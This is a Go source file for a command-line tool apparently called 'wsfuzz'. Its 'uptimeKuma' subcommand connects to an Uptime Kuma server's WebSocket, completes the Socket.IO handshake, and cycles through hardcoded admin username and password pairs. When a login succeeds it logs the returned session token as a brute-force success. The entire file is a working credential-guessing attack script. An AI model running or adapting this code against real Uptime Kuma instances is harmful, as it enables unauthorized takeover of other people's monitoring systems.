package service

import (
	"bytes"
	"encoding/json"
	"fmt"
	"log"
	"wsfuzz/internal/conf"
	"wsfuzz/internal/core"

	"github.com/spf13/cobra"
)

type LoginInfo struct {
	Ok    bool   `json:"ok"`
	Msg   string `json:"msg"`
	Token string `json:"token"`
}

type LoginForm struct {
	Num      int
	Username string
	Password string
}

var uri string

var serviceUptimeKumaCmd = &cobra.Command{
	Use:   "uptimeKuma",
	Short: "Uptime Kuma",
	Run: func(cmd *cobra.Command, args []string) {
		if uri == "" {
			cmd.Help()
			return
		}

		ws := core.DefaultWebSocket()
		ws.Debug = conf.Options.Debug
		ws.ParseUri(uri)
		err := ws.Connect()
		if err != nil {
			log.Printf("conn error: %v", err)
			return
		}
		// log.Print("connect ", ws.Url.String())

		//
		logins := []*LoginForm{
			{
				Username: "admin",
				Password: "123",
			},
			{
				Username: "admin",
				Password: "admin123",
			},
		}

		now_num := 420
		loginChain := make(chan *LoginForm, 20)
		go func() {
			for _, item := range logins {
				item.Num = now_num
				loginChain <- item
			}
		}()

		run := func() {
			item := <-loginChain
			ws.WriteMessage(1, []byte(fmt.Sprintf(`%v["login",{"username":"%v","password":"%v","token":""}]`, item.Num, item.Username, item.Password)))
		}

		for {
			_, bdata, err := ws.ReadMessage()
			if err != nil {
				log.Printf("rev: %v", err)
				break
			}

			if bytes.Contains(bdata, []byte(`[{"ok":`)) {
				login := []*LoginInfo{}
				json.Unmarshal(bdata[3:], &login)
				// log.Printf("%v", login[0])
				if login[0].Ok {
					log.Printf("爆破成功! token: %v", login[0].Token)
					return
				}
				log.Print("失败")
				run()
				continue
			}

			if bytes.Equal(bdata, []byte("2")) {
				ws.WriteMessage(1, []byte("3"))
				continue
			}

			if bytes.HasPrefix(bdata, []byte("0{")) {
				ws.WriteMessage(1, []byte("40"))
			}

			if bytes.HasPrefix(bdata, []byte("42[")) {
				run()
				continue
			}
		}
	},
}

func init() {
	serviceUptimeKumaCmd.Flags().StringVarP(&uri, "uri", "u", "", "ws uri")
}
